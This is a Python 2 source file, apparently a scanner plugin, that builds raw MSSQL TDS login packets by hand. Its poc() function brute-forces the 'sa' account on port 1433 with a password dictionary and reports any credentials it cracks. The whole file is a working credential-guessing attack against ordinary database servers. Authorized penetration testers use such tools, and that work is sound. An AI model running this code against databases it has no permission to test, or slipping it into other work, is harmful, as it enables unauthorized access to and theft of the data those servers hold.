# coding:utf-8
import socket
import binascii
import urlparse
from data.info_dict import MSSQL_PASSWORD_DICT


def auth(host, port, username, password, timeout):
    try:
        socket.setdefaulttimeout(timeout)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        hh = binascii.b2a_hex(host)
        husername = binascii.b2a_hex(username)
        lusername = len(username)
        lpassword = len(password)
        ladd = len(host) + len(str(port)) + 1
        hladd = hex(ladd).replace('0x', '')
        hpwd = binascii.b2a_hex(password)
        pp = binascii.b2a_hex(str(port))
        address = hh + '3a' + pp
        hhost = binascii.b2a_hex(host)
        data = "0200020000000000123456789000000000000000000000000000000000000000000000000000ZZ5440000000000000000000000000000000000000000000000000000000000X3360000000000000000000000000000000000000000000000000000000000Y373933340000000000000000000000000000000000000000000000000000040301060a09010000000002000000000070796d7373716c000000000000000000000000000000000000000000000007123456789000000000000000000000000000000000000000000000000000ZZ3360000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000Y0402000044422d4c6962726172790a00000000000d1175735f656e676c69736800000000000000000000000000000201004c000000000000000000000a000000000000000000000000000069736f5f31000000000000000000000000000000000000000000000000000501353132000000030000000000000000"
        data1 = data.replace(data[16:16 + len(address)], address)
        data2 = data1.replace(data1[78:78 + len(husername)], husername)
        data3 = data2.replace(data2[140:140 + len(hpwd)], hpwd)
        if lusername >= 16:
            data4 = data3.replace('0X', str(hex(lusername)).replace('0x', ''))
        else:
            data4 = data3.replace('X', str(hex(lusername)).replace('0x', ''))
        if lpassword >= 16:
            data5 = data4.replace('0Y', str(hex(lpassword)).replace('0x', ''))
        else:
            data5 = data4.replace('Y', str(hex(lpassword)).replace('0x', ''))
        hladd = hex(ladd).replace('0x', '')
        data6 = data5.replace('ZZ', str(hladd))
        data7 = binascii.a2b_hex(data6)
        sock.send(data7)
        packet = sock.recv(1024)
        if 'master' in packet:
            return True
    except Exception, e:
        pass


def poc(url):
    ip = urlparse.urlparse(url).netloc
    port = 1433
    timeout = 10
    user_list = ['sa']
    for user in user_list:
        for pass_ in MSSQL_PASSWORD_DICT:
            try:
                pass_ = str(pass_.replace('{user}', user))
                result = auth(ip, port, user, pass_, timeout)
                if result == True:
                    return u"[MsSQL_WeakPass]  %s  %s:%s  User:%s  Pass:%s" % (url, ip, port, user, pass_)
            except Exception,e:
                if "Errno 10061" in str(e) or "timed out" in str(e): return
